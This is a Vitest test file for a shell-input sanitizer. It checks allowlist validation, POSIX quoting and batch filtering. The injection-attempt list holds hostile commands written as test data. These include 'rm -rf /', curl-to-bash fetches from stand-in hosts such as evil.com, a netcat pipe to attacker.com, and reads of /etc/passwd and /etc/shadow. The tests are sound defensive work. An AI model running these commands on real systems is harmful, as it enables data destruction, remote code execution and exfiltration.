import { describe, it, expect, vi } from "vitest";
import {
  validateAgainstAllowlist,
  shellQuote,
  sanitizeForShellEmbedding,
  sanitizeListForShellEmbedding,
} from "../../src/workspaceforge/util/sanitize.js";

describe("validateAgainstAllowlist", () => {
  it("accepts alphanumeric names", () => {
    expect(validateAgainstAllowlist("auth").ok).toBe(true);
    expect(validateAgainstAllowlist("Module123").ok).toBe(true);
  });

  it("accepts dashes, underscores, and slashes", () => {
    expect(validateAgainstAllowlist("api-v2").ok).toBe(true);
    expect(validateAgainstAllowlist("my_module").ok).toBe(true);
    expect(validateAgainstAllowlist("src/api/handlers").ok).toBe(true);
  });

  it("rejects empty strings", () => {
    expect(validateAgainstAllowlist("").ok).toBe(false);
  });

  it("rejects non-string input", () => {
    expect(validateAgainstAllowlist(null).ok).toBe(false);
    expect(validateAgainstAllowlist(undefined).ok).toBe(false);
    expect(validateAgainstAllowlist(42).ok).toBe(false);
    expect(validateAgainstAllowlist({ x: 1 }).ok).toBe(false);
  });

  it("rejects values over the max length", () => {
    const long = "a".repeat(600);
    const result = validateAgainstAllowlist(long);
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/max length/);
  });

  describe("rejects real injection-attempt strings", () => {
    const injectionAttempts = [
      "rm -rf /",
      "foo; rm -rf ~",
      "foo' ; touch pwned; echo '",
      "$(whoami)",
      "`whoami`",
      "foo && curl evil.sh | sh",
      "foo || echo pwned",
      "foo\nrm -rf /",
      "foo|nc attacker.com 4444",
      "$(curl -s http://evil.com/payload.sh | bash)",
      "foo > /etc/passwd",
      "foo < /etc/shadow",
      "../../etc/passwd; cat $0",
      "module\"; rm -rf .; echo \"",
      "*",
      "~",
      "foo bar", // whitespace not allowed either
    ];

    for (const attempt of injectionAttempts) {
      it(`rejects: ${JSON.stringify(attempt)}`, () => {
        expect(validateAgainstAllowlist(attempt).ok).toBe(false);
      });
    }
  });

  it("accepts a path-traversal-looking but allowlist-legal string (slashes and dashes only)", () => {
    // Note: ".." itself contains only dots, which are NOT in the allowlist,
    // so path traversal attempts using ".." are also rejected.
    expect(validateAgainstAllowlist("../../etc/passwd").ok).toBe(false);
  });
});

describe("shellQuote", () => {
  it("wraps a value in single quotes", () => {
    expect(shellQuote("auth")).toBe("'auth'");
  });

  it("escapes embedded single quotes using the standard POSIX technique", () => {
    // Defense in depth -- even though the allowlist would already reject a
    // raw single quote, shellQuote itself must handle one safely if ever
    // called directly on a value that skipped validation.
    expect(shellQuote("foo'bar")).toBe("'foo'\\''bar'");
  });
});

describe("sanitizeForShellEmbedding", () => {
  it("returns a shell-quoted value for an allowlisted input", () => {
    expect(sanitizeForShellEmbedding("api-v2")).toBe("'api-v2'");
  });

  it("returns null and calls warn for a rejected value, without throwing", () => {
    const warn = vi.fn();
    const result = sanitizeForShellEmbedding("$(whoami)", warn);
    expect(result).toBeNull();
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0]?.[0]).toMatch(/skipped value/);
  });

  it("includes the provided label in the warning message", () => {
    const warn = vi.fn();
    sanitizeForShellEmbedding("bad;value", warn, { label: "test-label" });
    expect(warn.mock.calls[0]?.[0]).toMatch(/\[test-label\]/);
  });
});

describe("sanitizeListForShellEmbedding", () => {
  it("drops unsafe entries and keeps safe ones, continuing rather than aborting the batch", () => {
    const warn = vi.fn();
    const result = sanitizeListForShellEmbedding(["auth", "$(evil)", "api", "; rm -rf /"], warn);
    expect(result).toEqual(["'auth'", "'api'"]);
    expect(warn).toHaveBeenCalledTimes(2);
  });

  it("returns an empty array, not a throw, when every entry is unsafe", () => {
    const result = sanitizeListForShellEmbedding(["$(a)", "`b`", "c;d"]);
    expect(result).toEqual([]);
  });
});
